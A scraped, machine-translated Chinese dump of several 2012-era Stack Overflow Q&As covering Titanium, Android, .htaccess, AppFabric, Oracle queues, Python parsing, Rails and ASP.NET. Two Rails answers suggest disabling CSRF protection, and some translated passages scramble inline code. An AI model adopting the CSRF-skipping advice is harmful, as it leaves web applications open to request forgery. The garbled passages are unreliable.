            font:{fontSize:13}
        });

        outview.add(outlabel);

        inview.addEventListener('click',function(e){

               // Ti.API.info(';',e.row1.rowID);                

                var picker=Ti.UI.createPicker();
                picker.showTimePickerDialog({

                    callback: function(e){

                          if(e.cancel)
                          {
                             Ti.API.info('user canceled dialog');
                          }
                          else{

                                Ti.API.info('user selected date'+e.value);

                               var d=new Date(e.value);                                     
                               var time=String.formatTime(d);                                            

                               var newintime=d.getTime();

                                Ti.API.info(':'+time);                

                             //   var total=calculatetime(newintime,currouttime);

                             //   timelabel.text=total;

                                inlabel.text=time;                                                                        
                               //updateintime(date1,inlabel.text);

                          }
                    }

                });

        });

        outview.addEventListener('click',function(e){

                var picker=Ti.UI.createPicker();
                picker.showTimePickerDialog({

                    callback: function(e){

                          if(e.cancel)
                          {
                             Ti.API.info('user canceled dialog');
                          }
                          else{

                                Ti.API.info('user selected date'+e.value);

                                 var d=new Date(e.value);
                                 var time=String.formatTime(d);

                                 var newoutime=d.getTime();

                                 Ti.API.info(''+newoutime);      

                              //     var total=calculatetime(currintime,newoutime);

                                // timelabel.text=total;                                

                                 outlabel.text=time;
                             //   updateoutime(date1,outlabel.text);

                          }
                    }

                });

        });

        var timeview=Ti.UI.createView({
              width:"25%",

        });

         var intime=parseInt(inlabel.text);
         var outime=parseInt(outlabel.text);

         var time=intime-outime;

        var timelabel=Ti.UI.createLabel({

              text:time,              
              font:{fontSize:13}
        });

        timeview.add(timelabel);

        var noteview=Ti.UI.createImageView({                
            image:'TaskNote.png',
            width:"15%",

        });             

        noteview.addEventListener('click',function(e){

                    var tasknotewindow=Ti.UI.createWindow({
                    backgroundColor:'white',
                    layout:'vertical',
                    url:'TimeTracker/tasknote.js'

                });

                tasknotewindow.starttime=e.inlabel.text;

                tasknotewindow.open();
        });                         

        var taskview=Ti.UI.createView({
            width:"25%",

        });

        tasklabel=Ti.UI.createLabel({
             text:"Click",
             font:{fontSize:13},

        });

        //create window for task management
        var taskmanagewindow = Ti.UI.createWindow({
                    backgroundColor: 'white', layout: 'vertical',
                    url:'TimeTracker/task.js'
        }); 

        //Task Dialog Box
        taskoptionBox=Ti.UI.createOptionDialog({                            
                title:'Task',
                options:arrtaskname,
                buttonNames:['Cancel'],                     
         });

         taskoptionBox.addEventListener('click',function(e){                
             tasklabel.text= arrtaskname[e.index];                   
         });

        tasklabel.addEventListener('click',function(e){                 
                taskoptionBox.show();               
        });

        taskview.add(tasklabel);

        row1.add(inview);
        row1.add(outview);
        row1.add(timeview);
        row1.add(noteview);
        row1.add(taskview);         

        section.add(row1);
        data.push(section);
        table.setData(data); 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T14:51:23.507

看看这个问题/答案。也许您将能够使用它来实现您的目标。我想你们都在尝试同样的事情。

[如何在 tableviewrow (Titanium Studio) 中查找或跟踪子点击](https://stackoverflow.com/questions/12776584/how-to-find-or-trace-child-click-in-tableviewrow-titanium-studio/12784096#comment17281686_12784096)

这就是我一直做到这一点的方式：

```
row1 = Ti.UI.createTableViewRow({
  layout:"horizontal",
  myval: intime // <=== Add your value here that you want to query for.
});
...
inlabel=Ti.UI.createLabel({
  text:intime,
  font:{fontSize:13}
});
inview.add(inlabel);
...

tableview.addEventListener('click', function(e){
  alert(e.rowData.myval);
});
...

// This section seems jumbled.  Should be something along the lines of the following...
// You have:
// section.add(row1);
// data.push(section);
// table.setData(data);
// Change to:
data.push(row1);
table.setData(data);
section.add(table); 
```

最初，我以为您想根据您现在看起来不同的评论来操纵行内的标签。

# android - 插入数据库错误

> ID：14039451
> 
> 赞同：0
> 
> 时间：2012-12-26T10:42:55.830
> 
> 标签：android, database

这可能很简单，但会出错，所以请帮助我。我有列表视图，并且在每一行中都有按钮，当我单击按钮时，它应该采用该特定行的标题并将其插入数据库。当我单击按钮时，它实际上给了我标题，但是我在将该标题插入数据库时​​遇到问题。在 LazyAdapter 类中，我有以下代码

```
 Button play = (Button)vi.findViewById(R.id.imageArrow);
    play.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub
            System.out.println("play clicked!");
            String pgm_title = title.getText().toString();
            System.out.println("item selected: "+ pgm_title);

            CustomizedListView cust = new CustomizedListView();
            cust.InsertPlayItem(pgm_title);
        }
    }); 
```

在主要活动中我有这个代码。这段代码有什么问题？

```
 public void InsertPlayItem(String pgm_title) {
    // TODO Auto-generated method stub
    DatabaseHandler db = new DatabaseHandler(getBaseContext());//getting error here
    db.insertPlayList(pgm_title);
} 
```

出现以下错误：

```
12-26 16:03:00.751: W/dalvikvm(5861): threadid=1: thread exiting with uncaught exception (group=0x40015560)
12-26 16:03:00.772: E/AndroidRuntime(5861): FATAL EXCEPTION: main
12-26 16:03:00.772: E/AndroidRuntime(5861): java.lang.NullPointerException
12-26 16:03:00.772: E/AndroidRuntime(5861):     at android.database.sqlite.SQLiteOpenHelper.getWritableDatabase(SQLiteOpenHelper.java:118)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at com.example.devices.DatabaseHandler.insertPlayList(DatabaseHandler.java:422)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at com.example.programs.CustomizedListView.InsertPlayItem(CustomizedListView.java:137)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at com.example.programs.LazyAdapter$1.onClick(LazyAdapter.java:131)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at android.view.View.performClick(View.java:2485)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at android.view.View$PerformClick.run(View.java:9080)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at android.os.Handler.handleCallback(Handler.java:587)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at android.os.Handler.dispatchMessage(Handler.java:92)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at android.os.Looper.loop(Looper.java:123)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at android.app.ActivityThread.main(ActivityThread.java:3683)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at java.lang.reflect.Method.invokeNative(Native Method)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at java.lang.reflect.Method.invoke(Method.java:507)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
12-26 16:03:00.772: E/AndroidRuntime(5861):     at dalvik.system.NativeStart.main(Native Method) 
```

还有我的数据库部分：

```
 public void insertPlayList(String playname) {
        SQLiteDatabase db = this.getWritableDatabase();

        ContentValues values = new ContentValues();
        values.put(play_list, playname);
        // Inserting Row
        db.insert(Personalize, null, values);
        db.close(); // Closing database connection
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:15:40.890

最后我得到了..在 LazyAdapter 类中只有我喜欢这个。

```
 Button play = (Button)vi.findViewById(R.id.imageArrow);
    play.setOnClickListener(new OnClickListener() {

        @Override
        public void onClick(View v) {
            // TODO Auto-generated method stub
            System.out.println("play clicked!");
            String pgm_title = title.getText().toString();
            System.out.println("item selected: "+ pgm_title);
            DatabaseHandler db = new DatabaseHandler(activity);
            db.insertPlayList(pgm_title);
                        }
         } 
```

# php - 使用 htaccess 将 allfile.php 文件重写为 allfile.html

> ID：14039452
> 
> 赞同：0
> 
> 时间：2012-12-26T10:42:57.350
> 
> 标签：php, html, .htaccess, url-rewriting

我想将php扩展的所有文件重写为html

像这样的例子

```
www.mydomain.com/file.php to www.mydomain.com/file.html 
```

我把这段代码放在我的 htaccess 上

```
AddHandler application/x-httpd-php .php .html .htm 
```

但它不会工作

我能做什么工作这段代码

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:45:09.023

```
RewriteEngine on
RewriteBase /
RewriteRule ^(.*)\.html$ $1.php [R=permanent] 
```

# c# - 有没有办法以编程方式检查 AppFabric 缓存主机是否处于活动状态？

> ID：14039453
> 
> 赞同：2
> 
> 时间：2012-12-26T10:43:06.930
> 
> 标签：c#, .net, status, appfabric, host

我想`AppFabric`通过c#编程获取缓存主机的运行状态。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:07:32.347

您可以`Powershell`按照以下步骤使用命令执行此操作；

*   下载[`PowerShell v2 SDK`](http://www.microsoft.com/en-us/download/details.aspx?id=2560)
*   创建一个运行我们的 Powershell 命令的环境。

> ```
> var initialSessionState = InitialSessionState.CreateDefault();
> initialSessionState.ThrowOnRunspaceOpenError = true;
> runspace = RunspaceFactory.CreateRunspace(initialSessionState);
> runspace.Open(); 
> ```

*   让我们创建一个管道。

> `var pipeline = runspace.CreatePipeline();`

*   将命令行传递到在缓存中运行的 Powershell 中的管道。

> ```
> pipeline.Commands.Add(new Command("Use-CacheCluster"));
> pipeline.Commands.Add(new Command("Get-CacheHost")); 
> ```

`Get-CacheHost`给我们缓存服务器信息。并用`Invoke()`方法运行。

> `var result = pipeline.Invoke();`

*   有`result`对象，

> ```
> var initialSessionState = InitialSessionState.CreateDefault();
> initialSessionState.ImportPSModule(new[] { "DistributedCacheAdministration" });
> initialSessionState.ThrowOnRunspaceOpenError = true;
> 
> runspace = RunspaceFactory.CreateRunspace(initialSessionState);
> 
> runspace.Open();
> 
> var pipeline = runspace.CreatePipeline();
> pipeline.Commands.Add(new Command("Use-CacheCluster"));
> pipeline.Commands.Add(new Command("Get-CacheHost"));
> var result = pipeline.Invoke();
> 
> var hostInfo = (HostInfo)result[0].BaseObject;
> 
> Console.Out.WriteLine("Server Name        : " + hostInfo.HostName);
> Console.Out.WriteLine("Server Port      : " + hostInfo.PortNo);
> Console.Out.WriteLine("Server Service Name : " + hostInfo.ServiceName);
> Console.Out.WriteLine("Server Status    : " + hostInfo.Status);
> Console.Out.WriteLine("Server Version     : " + hostInfo.VersionInfo); 
> ```

另外，不要忘记添加这些程序集引用；

*   `Microsoft.ApplicationServer.Caching.Client`
*   `Microsoft.ApplicationServer.Caching.Core`
*   `Microsoft.ApplicationServer.Caching.Management`
*   `System.Management.Automation`

# android - 如何判断一个 View 在 Android 屏幕上是否可见？

> ID：14039454
> 
> 赞同：57
> 
> 时间：2012-12-26T10:43:08.913
> 
> 标签：android, android-view, android-scrollview, visible

我想检查 a`View`中的 a`ScrollView`当前是否在 Android 中可见。我没有检查它是否集中在屏幕上，但它当前是否显示在屏幕上。有没有一种方法`View`可以告诉我视图当前是否可见？

* * *

## 回答 #1

> 赞同：64
> 
> 时间：2018-02-28T20:35:15.520

这段代码对我有用：

```
public static boolean isVisible(final View view) {
    if (view == null) {
        return false;
    }
    if (!view.isShown()) {
        return false;
    }
    final Rect actualPosition = new Rect();
    view.getGlobalVisibleRect(actualPosition);
    final Rect screen = new Rect(0, 0, getScreenWidth(), getScreenHeight());
    return actualPosition.intersect(screen);
} 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2017-01-17T07:04:53.640

```
int[] location = new int[2];
view.getLocationOnScreen(location); 
```

或者

```
Rect rect = new Rect();
view.getGlobalVisibleRect(rect); 
```

现在使用这个位置或矩形来检查它是否在你的可见范围内。如果只是整个屏幕，请检查`getResources().getDisplayMetrics()`.

正如 Antek 在下面的评论中指出的那样，视图可能仍然消失或不可见，这里的返回值告诉了它上次绘制的位置。因此，将上述与边界相关的条件与`view.isShown()`or结合起来`view.getVisibility() == VISIBLE`应该注意这一点。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2021-04-01T15:15:52.797

[zegee29 的](https://stackoverflow.com/a/49038086/6029532)回答很有帮助。虽然我也想建议使用的结果`view.getGlobalVisibleRect(actualPosition)`，因为在某些情况下，当 item 根本不可见时`Rect.intersects()`返回，所以结果代码是：`true`

```
fun View.isVisible(): Boolean {
    if (!isShown) {
        return false
    }
    val actualPosition = Rect()
    val isGlobalVisible = getGlobalVisibleRect(actualPosition)
    val screenWidth = Resources.getSystem().displayMetrics.widthPixels
    val screenHeight = Resources.getSystem().displayMetrics.heightPixels
    val screen = Rect(0, 0, screenWidth, screenHeight)
    return isGlobalVisible && Rect.intersects(actualPosition, screen)
} 
```

或者你可能只是结果`getGlobalVisibleRect(actualPosition)`

* * *

## 回答 #4

> 赞同：-9
> 
> 时间：2016-06-03T07:55:46.810

尝试

```
if(view.isShown()) {
    // Visible
} else { 
    // Invisible
} 
```

* * *

## 回答 #5

> 赞同：-20
> 
> 时间：2015-05-02T18:07:13.787

public boolean checkVisiblity（查看视图）{

if(view.isShown()) 返回真；否则返回假；

}

* * *

## 回答 #6

> 赞同：-29
> 
> 时间：2012-12-26T11:31:12.527

函数 View.getVisibility() 可以具有以下值：

*   View.VISIBLE (0)：视图可见。

*   View.INVISIBLE (1)：视图是不可见的，但它仍然占用空间用于布局。

*   View.GONE (2)：视图消失了。完全隐藏，好像没有添加视图

您可以查看以下链接以获取更多信息。 [如何检查视图在 Android 中是否可见？](https://stackoverflow.com/questions/3791607/how-can-i-check-if-a-view-is-visible-or-not-in-android/3791698#3791698)

# visual-studio - Visual Studio 多次复制和粘贴问题

> ID：14039461
> 
> 赞同：0
> 
> 时间：2012-12-26T10:43:39.217
> 
> 标签：visual-studio, copy-paste

我按住`CTRL-Shift-`然后按`V`多次以从我之前的几次粘贴列表中粘贴。[不确定此列表的上限是多少]。

我的问题是，每当我用`CTRL-Delete`Visual Studio 删除一行时，我的整个粘贴列表都会替换为我用`CTRL-Delete`.

有任何想法吗？

另一件事：我如何遍历粘贴列表。（每次按 V 都会从列表中删除……我该如何恢复？）

如果这有所作为，我正在使用 VS 2012。

谢谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-08-07T10:54:27.317

您可以使用 Ctrl+Shift+L 删除一行，而无需将其复制到剪贴板

（我使用 Ctrl+L 删除一行并将其复制到剪贴板，因此我们可能没有相同的快捷方式设置）

/罗伯特

# network-programming - 获取 LAN 中连接的 Windows 应用商店应用的主机名列表

> ID：14039465
> 
> 赞同：0
> 
> 时间：2012-12-26T10:43:47.900
> 
> 标签：network-programming, windows-runtime, windows-store-apps

我实际上尝试了以下代码，它给了我本地机器IP地址，名称和服务器IP地址的结果

```
var hostNamesList = NetworkInformation.GetHostNames();
                    HostName serverHost = new HostName("cptdomain.ctl.local");
                    StreamSocket clientSocket = new Windows.Networking.Sockets.StreamSocket();

                    // Try to connect to the remote host
                    await clientSocket.ConnectAsync(serverHost, "http");

                    foreach (var entry in hostNamesList)
                    {
                        if (entry.Type == HostNameType.DomainName)
                        {
                 hostName.Text = "Machine Name : " + entry.DisplayName;
                 IPAddress.Text = "Machine IP : " + clientSocket.Information.LocalAddress.DisplayName;
                 ServerAddress.Text = "Server IP : " + clientSocket.Information.RemoteAddress.DisplayName;

                            }
                    }
                } 
```

但实际上我的要求是，如何为 Windows Store Apps 获取连接到 LAN 中服务器的计算机的 IP 地址和名称列表。

请在这方面指导我以获得运行我的商店应用程序的正确解决方案。

**注意：**这里我使用 WinRT 处理 windows8 商店应用程序

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T15:34:43.043

这就是你在一个[完整的 c# 应用程序](http://www.codeproject.com/Articles/16113/Retreiving-a-list-of-network-computer-names-using)中执行此操作的方式，但我认为您不能在 winrt 应用程序中执行此操作。至少，您必须添加专用网络权限。

# gtk - Glade GUI builder：设置按钮小部件资源

> ID：14039466
> 
> 赞同：3
> 
> 时间：2012-12-26T10:43:49.763
> 
> 标签：gtk, ubuntu-12.04, glade

伙计们，

我花了最后几个小时在新安装的 Ubuntu（12.04 和 GTK+3）上玩 Glade（3.12.1）。

我不明白为什么我无法更改 Glade 中按钮的背景或前景色。

我错过了什么吗？

使用 Glade 然后不得不增加 Glade 生成的代码（首先从 XML -> c/python/PHP/ 获取）似乎否定了使用 GUI 构建器的好处。

通过各种论坛的巨魔使我相信版本 2 和 3 之间发生了重大变化。似乎 GTK+3 将/正在使用 CSS 来设置小部件/整体 GUI 应用程序的样式。但是，我找不到任何关于如何在定义 Glade 中构建的 GUI 样式时集成/包含 CSS 和 Glade 的文档。

非常感谢任何和所有帮助...

# java - 如何从动态excel文件中读取？

> ID：14039470
> 
> 赞同：1
> 
> 时间：2012-12-26T10:44:04.297
> 
> 标签：java, excel, jxl

我的动态 excel 文件中的值每秒都在变化，我想通过 java 读取新值。我面临的问题是我必须始终保存文件，然后将其值加载到程序中。excel是否有可能在内部自动保存文件，以便我每次都加载新值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:47:47.557

阿曼，你能澄清一下你的excel表格是从哪里动态更新的吗？如果您是通过另一个程序编写它，那么您必须在输出流中使用 write 方法。那么只有值将被保留

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:08:28.663

```
Values in my dynamic excel file are changing every second 
```

这是否意味着它已经保存在硬盘中或将被保存？谁在改变价值？你或其他应用程序？

确保保留更改。否则，您正在从 HD 读取相同的值，而不是从 RAM 读取。

```
Is it possible that excel internally saves the file automatically 
```

为此，您需要使用 VBA。，我认为您不需要知道。但是您可以自己从 Java 中做到这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:08:28.707

您将此 excel 文件保存在一个文件夹中并启动一个线程来监视该 excel 文件。意味着您可以轮询此 excel 文件并获取 Java 代码中的最新内容。

# oracle - 创建过程出错

> ID：14039472
> 
> 赞同：0
> 
> 时间：2012-12-26T10:44:11.200
> 
> 标签：oracle, plsql, oracle10g, oracle11g, dbms-scheduler

> **可能重复：**
> [Oracle 中的 PL/SQL 函数看不到 DBMS_AQ](https://stackoverflow.com/questions/1378721/pl-sql-function-in-oracle-cannot-see-dbms-aq)

以下是我将数据排入队列的过程，在运行该过程时出现编译错误，我找不到出错的地方。请帮我解决。

```
CREATE OR REPLACE PROCEDURE p_enqueue(msg IN VARCHAR2)
AS
PRAGMA AUTONOMOUS_TRANSACTION;
enqueue_options dbms_aq.enqueue_options_t;
message_properties dbms_aq.message_properties_t;
message_handle RAW(16);
BEGIN
dbms_aq.enqueue( queue_name => 'example_queue',
enqueue_options => enqueue_options,
message_properties => message_properties,
payload => message_type(msg),
msgid => message_handle);
COMMIT;
END; 
```

错误：

PLS-00201：必须声明标识符“DBMS_AQ”

PLS-00320：此表达式类型的声明不完整或格式错误

当我尝试使用授予权限时，出现以下错误

错误 ORA-01031: 权限不足

如果这是我运行下面的 pl/sql 块来排队消息的问题，那么程序已成功创建。如果权限不存在怎么可能？

```
DECLARE
enqueue_options dbms_aq.enqueue_options_t;
message_properties dbms_aq.message_properties_t;
message_handle RAW(16);
message message_typ;

BEGIN
message := message_typ('NORMAL MESSAGE',
'enqueued to msg_queue first.');

dbms_aq.enqueue(queue_name => 'msg_queue', 
enqueue_options => enqueue_options, 
message_properties => message_properties, 
payload => message, 
msgid => message_handle);

COMMIT;
end; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:25:23.380

错误消息说 DBMS_AQ 不知道。由于这是 SYS 拥有的 Oracle 包，因此它确实存在。所以你失去了查看和执行它的权利。

你跑了吗

```
grant EXECUTE ON DBMS_AQ to appuser; 
```

正如我对您之前的一个问题的[回答中明确显示的那样？](https://stackoverflow.com/a/13681124/413337)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T12:16:00.533

检查 DBMS_AQ pkg 并找出您使用的程序的强制参数。

下面的查询对队列很有用。

```
SELECT name, enqueue_enabled, dequeue_enabled
FROM user_queues;

SELECT owner, queue_name, queue_table, consumer_name
FROM dba_queue_subscribers;

SELECT queue_name, consumer_name, address, protocol, delivery_mode, queue_to_queue
FROM user_queue_subscribers;

SELECT qname, destination, start_date, start_time, propagation_window, next_time, latency
FROM user_queue_schedules;

SELECT qname, process_name, session_id, instance, last_run_date, last_run_time, current_start_date
FROM user_queue_schedules;

SELECT qname, current_start_time, next_run_date, next_run_time, total_time, total_number
FROM user_queue_schedules;

SELECT qname, total_bytes, max_number, max_bytes, avg_number, avg_size, avg_time
FROM user_queue_schedules; 
```

# python - 字符串格式的正则表达式

> ID：14039474
> 
> 赞同：0
> 
> 时间：2012-12-26T10:44:27.067
> 
> 标签：python

我有一个字符串

```
(device
    (vfb
        (xxxxxxxx)
        (xxxxxxxx)
        (location 0.0.0.0:5900)
    )
)

(device
    (console
        (xxxxxxxx)
        (xxxxxxxx)
        (location 80)
    )
) 
```

我需要从字符串的“vfb”部分读取位置行。我尝试使用正则表达式，例如

```
 import re
  re.findall(r'device.*?\vfb.*?\(.*?(.*?).*(.*?\)) 
```

但它没有给我所需的输出。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T12:30:47.817

最好使用解析器来解决此类问题。幸运的是，在您的情况下，解析器将相当简单：

```
def parse(source):

    def expr(tokens):
        t = tokens.pop(0)
        if t != '(':
            return {'value': t}
        key, val = tokens.pop(0), {}
        while tokens[0] != ')':
            val.update(expr(tokens))
        tokens.pop(0)
        return {key:val}

    tokens = re.findall(r'\(|\)|[^\s()]+', source)
    lst = []
    while tokens:
        lst.append(expr(tokens))
    return lst 
```

鉴于上面的片段，这将创建一个结构，如：

```
[{'device': {'vfb': {'location': {'value': '0.0.0.0:5900'}, 'xxxxxxxx': {}}}},
 {'device': {'console': {'location': {'value': '80'}, 'xxxxxxxx': {}}}}] 
```

现在你可以迭代它并获取你需要的任何东西：

```
for item in parse(source):
    try:
        location = item['device']['vfb']['location']['value']
    except KeyError:
        pass 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-26T13:02:12.920

通过 Martijn Pieters 的介绍，这是一种 pyparsing 方法：

```
inputdata = """(device
    (vfb
        (xxxxxxxx)
        (xxxxxxxx)
        (location 0.0.0.0:5900)
    )
)

(device
    (console
        (xxxxxxxx)
        (xxxxxxxx)
        (location 80)
    )
)"""

from pyparsing import OneOrMore, nestedExpr

# a nestedExpr defaults to reading space-separated words within nested parentheses
data = OneOrMore(nestedExpr()).parseString(inputdata)

print (data.asList())

# recursive search to walk parsed data to find desired entry
def findPath(seq, path):
    for s in seq:
        if s[0] == path[0]:
            if len(path) == 1:
                return s[1]
            else:
                ret = findPath(s[1:], path[1:])
                if ret is not None:
                    return ret
    return None
print findPath(data, "device/vfb/location".split('/')) 
```

印刷：

```
[['device', ['vfb', ['xxxxxxxx'], ['xxxxxxxx'], ['location', '0.0.0.0:5900']]], 
 ['device', ['console', ['xxxxxxxx'], ['xxxxxxxx'], ['location', '80']]]]
0.0.0.0:5900 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T11:21:20.440

也许这会让你开始：

```
In [84]: data = '(device(vfb(xxxxxxxx)(xxxxxxxx)(location 0.0.0.0:5900)))'

In [85]: m = re.search(r"""
  .....:     vfb
  .....:     .*
  .....:     \(
  .....:         location
  .....:         \s+
  .....:         (
  .....:             [^\)]+
  .....:         )
  .....:     \)""", data, flags=re.X)

In [86]: m.group(1)
Out[86]: '0.0.0.0:5900' 
```

# ruby-on-rails - Rails 3：无法验证 CSRF 令牌的真实性

> ID：14039475
> 
> 赞同：7
> 
> 时间：2012-12-26T10:44:30.520
> 
> 标签：ruby-on-rails, ruby-on-rails-3

当我尝试通过我的 REST 客户端发布数据时，我收到这样的警告

```
Warning :Can't verify CSRF token authenticity. 
```

如何解决这个问题。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-26T10:55:20.287

我相信您正在尝试`POST`从 a 中制作 a `link`。默认情况下`links`不应该发出`POST`请求，只会发出请求`GET`。因此，当您尝试连接到您的服务器时，会`Rails`向您发出警告。
绕过这种行为的一种方法是，而不是使用 a `link`，使用 a `form`。因此，您可以向服务器发出适当的`POST`请求。
或者，您可以`protect_from_forgery`从您的 , 中删除该行`application_controller`，因此`Rails`不进行此类验证，但极不推荐这样做。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T20:03:20.930

你可以这样做，（但不推荐:)），跳过伪造保护

例如：您将数据发布到 PostController => 创建操作

```
class PostsController < ApplicationController

   before_filter :protect_from_forgery, :except => [:create]  

   def create
        #your method
   end
end 
```

但话虽如此，我相信应该有更好的方法来做你想做的事，所以如果你能解释你想做什么，有人可以帮忙

高温高压

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-12-25T13:39:21.700

无

我在 application.js 中错过了以下行

```
//= require jquery_ujs 
```

我更换了它和它的工作..

# ruby-on-rails - Rake 单元测试：“否”列使用“假”

> ID：14039477
> 
> 赞同：0
> 
> 时间：2012-12-26T10:44:47.503
> 
> 标签：ruby-on-rails, ruby-on-rails-3, unit-testing, rake

# 发布 :: 模型

```
class Post < ActiveRecord::Base
  attr_accessible :body, :name, :no, :num
end 
```

# Posts.yml 下 (test/fixtures/)

```
one:
  name: MyString
  body: MyString
  no: 1
  num: 2 
```

运行时`rake test:units`，会生成以下堆栈跟踪

```
Error:
test_Post_for_correct_attributes(PostTest):
ActiveRecord::StatementInvalid: SQLite3::SQLException: table posts has no column named false: INSERT INTO "posts" ("name", "body", "false", "num", "created_at", "updated_at", "id") VALUES ('MyString', 'MyString', 1, 2, '2012-12-26 10:24:36', '2012-12-26 10:24:36', 980190962) 
```

现在，这里 - 表字段“否”已转换为“假”。（这似乎是一个问题，因为它被解释为 FALSE 而不是对象变量）

将变量从 yaml 转换为对象的错误？

Rails 版本`Rails 3.2.9`和 Ruby`ruby 1.9.3p194`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:54:07.847

这对我来说似乎是一个错误，因为 Rails 应该能够接受这一点，特别是因为这是自动生成的。无论如何，作为临时锻炼，您可以使用：

```
one:
  name: MyString
  body: MyString
  "no": 1
  num: 2 
```

# asp.net - 带有修复标头的可滚动 Gridview

> ID：14039478
> 
> 赞同：1
> 
> 时间：2012-12-26T10:44:50.307
> 
> 标签：asp.net, html, visual-studio, gridview

> **可能重复：**
> [在 asp.net 中修复了具有水平和垂直滚动的 GridView 标题](http://stackoverflow.com/questions/7625706/fixed-gridview-header-with-horizontal-and-vertical-scrolling-in-asp-net)

我有一个任务要设计来构建一个带有修复标题的可滚动网格视图。我试过用 Div 开发它

```
 <div id="DataDiv" style="overflow: auto; border: 1px solid olive; 
        width: 600px; height: 300px;" />

  <asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="false" OnRowDataBound="Gridview1_RowDataBound"
            ShowHeader="false" RowStyle-VerticalAlign="Bottom">
            <Columns>
                <asp:BoundField DataField="dbms_id" HeaderText="ID" ItemStyle Width="30px" />
                <asp:BoundField DataField="dbms" HeaderText="Dbms" ItemStyle-Width="50px" />
                <asp:BoundField DataField="version" HeaderText="Version" ItemStyle-Width="30px" />
            </Columns>
        </asp:GridView>
    </div> 
```

但它不起作用，因为标题没有得到修复。

然后我又找到了一个代码，如

```
<div style=" background-repeat: repeat-x; height: 30px;
        width: 200px; margin: 0; padding: 0">
        <table cellspacing="0" cellpadding="0" rules="all" border="1" id="tblHeader" style="font-family: Arial;
            font-size: 10pt; width: 200px; color: Black; border-collapse: collapse; height: 100%;">
            <tr>
                <td style="width: 30px; text-align: center">
                   ID
                </td>
                <td style="width: 50px; text-align: center">
                    Dbms
                </td>
                <td style="width: 30px; text-align: center">
                    Version
                </td>
            </tr>
        </table>
    </div>
    <div style ="height:100px; width:617px; overflow:auto;">
        <asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="false" OnRowDataBound="Gridview1_RowDataBound"
            ShowHeader="false" RowStyle-VerticalAlign="Bottom">
            <Columns>
                <asp:BoundField DataField="dbms_id" HeaderText="ID" ItemStyle-Width="30px" />
                <asp:BoundField DataField="dbms" HeaderText="Dbms" ItemStyle-Width="50px" />
                <asp:BoundField DataField="version" HeaderText="Version" ItemStyle-Width="30px" />
            </Columns>
        </asp:GridView>
    </div> 
```

在这种方法中，我正在使用纯 html 设计标题。

现在的问题是，实现这一要求的最佳方法是什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:05:02.307

除了您的问题之外，您还应该了解以下几点：

1）通过设计表格单元格将自动调整大小并匹配最长单元格的内容，使表格可读。如果您通过固定其标题来破坏此“规则”您将不得不注意调整标题单元格的大小，因为标题不再受表格规则的约束。

2）纯[HTML/CSS 解决方案](http://gomathikrishna.net/demos/scroll.html)仅在您为所有单元格（表格和标题）设置静态长度时才有效。如果内容太长而无法容纳一个单元格并且不可能换行（我有时会使用德语名词，所以我知道这是可能的）一切都会分崩离析。

3）如果您想要一个动态解决方案，您必须在每次内容更改时使用 JS 重新计算表格单元格。

我想这很简单的解释。如果您需要一些示例，请告诉我，我会为您提供一个。

玩得开心！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T18:04:21.347

我做过几次这样的事情。

[http://www.codeproject.com/Tips/471756/Fixed-Table-Header-atop-scrollable-GridView-in-ASP](http://www.codeproject.com/Tips/471756/Fixed-Table-Header-atop-scrollable-GridView-in-ASP)

我能给出的唯一提示是远离网格上的垂直线。很难让 gridview 上的线条和表格上的线条在浏览器中对齐。

# ruby-on-rails - rails noob 学习 rspec 的最佳方法是什么？

> ID：14039480
> 
> 赞同：7
> 
> 时间：2012-12-26T10:45:03.103
> 
> 标签：ruby-on-rails, rspec

我一直在阅读尽可能多的教程并观看有关学习 rspec 的各种视频...我也仔细阅读了有关测试的 rails 指南和 rspec 文档。不要觉得它被点击了，我只是在黑暗中漫游。

有人对 rspec 和测试 rails 应用程序有一些建议吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-26T10:51:28.747

只需开始编写规范，您就会感受到力量。我还推荐一个很好的指南[http://betterspecs.org/](http://betterspecs.org/)和[Rspec 书](http://pragprog.com/book/achbd/the-rspec-book)

* * *

## 回答 #2

> 赞同：6
> 
